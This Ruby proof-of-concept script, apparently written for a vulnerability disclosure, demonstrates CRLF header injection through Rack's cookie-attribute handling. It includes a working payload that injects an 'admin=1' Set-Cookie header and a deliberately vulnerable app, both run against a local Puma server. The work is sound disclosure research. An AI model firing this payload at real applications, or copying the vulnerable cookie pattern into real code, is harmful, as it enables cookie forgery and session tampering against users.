#!/usr/bin/env ruby
# frozen_string_literal: true
#
# PoC — CRLF injection through Rack::Utils.set_cookie_header cookie attributes
#       (:domain / :path / :max_age are interpolated unvalidated into `set-cookie`).
#
# Part 1: library level - the exact header Rack builds (no server needed)
# Part 2: Rack::Lint rejects the very same header Rack just built
# Part 3: end-to-end against Puma - attacker-controlled `Set-Cookie` reaches the client
#
# Tested: rack 3.2.0 (main@58e5d22) and rack 3.2.7 (released gem), ruby 3.3.8, puma 8.0.2
#
require "rack"
require "socket"

def banner(t) = puts("\n=== #{t} " + "=" * (72 - t.length))

CRLF  = "\r\n"
PAYLOAD = "evil.example#{CRLF}admin=1; Path=/; Max-Age=31536000"

banner "Part 1 — library level"
h = {}
Rack::Utils.set_cookie_header!(h, "tenant", { value: "acme", domain: ".#{PAYLOAD}", httponly: true })
puts "attr  : domain: #{PAYLOAD.inspect}"
puts "header: #{h['set-cookie'].inspect}"
puts "bytes : #{h['set-cookie'].bytes.each_slice(16).map { |s| s.join(' ') }.join("\n        ")}"
puts "CRLF present in header value? #{h['set-cookie'].include?(CRLF)}"

banner "Part 2 — Rack::Lint rejects the header Rack just produced"
app = lambda do |_env|
  r = Rack::Response.new
  r.set_cookie("tenant", { value: "acme", domain: ".#{PAYLOAD}", httponly: true })
  r.finish
end
begin
  Rack::Lint.new(app).call(Rack::MockRequest.env_for("/"))
  puts "Lint accepted (unexpected)"
rescue Rack::Lint::LintError => e
  puts "Lint: #{e.class}: #{e.message}"
end

banner "Part 3 — end-to-end: Puma 8.0.2 emits an attacker-controlled Set-Cookie"
port = 9411
victim = lambda do |env|
  req = Rack::Request.new(env)
  res = Rack::Response.new
  # ---- the vulnerable-but-idiomatic line: request data as a cookie attribute ----
  res.set_cookie("tenant", { value: "acme", domain: ".#{req.params['tenant']}", httponly: true })
  res.write "hello\n"
  res.finish
end

server_rb = <<~RUBY
  require "rack"; require "puma"; require "puma/server"
  APP = #{victim.inspect rescue ''}
RUBY
# victim lambda cannot be marshalled, so run the server in-process in a thread
require "puma"
require "puma/server"
srv = Puma::Server.new(victim)
srv.add_tcp_listener("127.0.0.1", port)
t = Thread.new { srv.run }
sleep 0.1 until (TCPSocket.new("127.0.0.1", port).close rescue nil).nil?

req_line = "GET /?tenant=#{URI.encode_www_form_component(PAYLOAD).gsub('+', '%20')} HTTP/1.1"
sock = TCPSocket.new("127.0.0.1", port)
sock.write("#{req_line}\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
raw = sock.read
sock.close
srv.stop(true) rescue nil

puts "request : #{req_line}"
puts "response: #{raw.inspect}"
puts
puts raw.include?("set-cookie: admin=1; Path=/; Max-Age=31536000") ?
  "RESULT  : VULNERABLE — the injected cookie is emitted as its own Set-Cookie header" :
  "RESULT  : not exploitable on this server"
